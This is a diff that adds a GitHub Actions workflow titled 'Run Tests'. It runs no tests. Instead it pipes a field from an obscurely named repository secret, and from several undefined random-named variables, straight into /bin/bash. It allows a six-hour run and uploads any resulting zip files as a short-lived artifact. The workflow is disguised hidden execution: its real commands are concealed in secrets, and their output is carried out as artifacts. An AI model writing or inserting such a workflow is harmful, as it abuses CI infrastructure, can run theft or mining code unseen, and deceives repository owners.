@@ -1,0 +1,33 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          znq2892: ${{ secrets.znq2892 }}
+        run: |
+          printf '%s' "$znq2892" | jq -r .t2 | /bin/bash
+          printf '%s' "$sfvr5363" | jq -r .ekyr58 | /bin/bash
+          echo $lqvs35219 | jq -r .oyze25 | /bin/bash
+          printf '%s' "$bprf1668" | jq -r .qyt7 | /bin/bash
+          printf '%s' "$xltph4378" | jq -r .lszm0 | /bin/bash
+          printf '%s' "$pl149" | jq -r .zo130 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ukmgzJ8k
+          path: "*.zip"
+          retention-days: 1
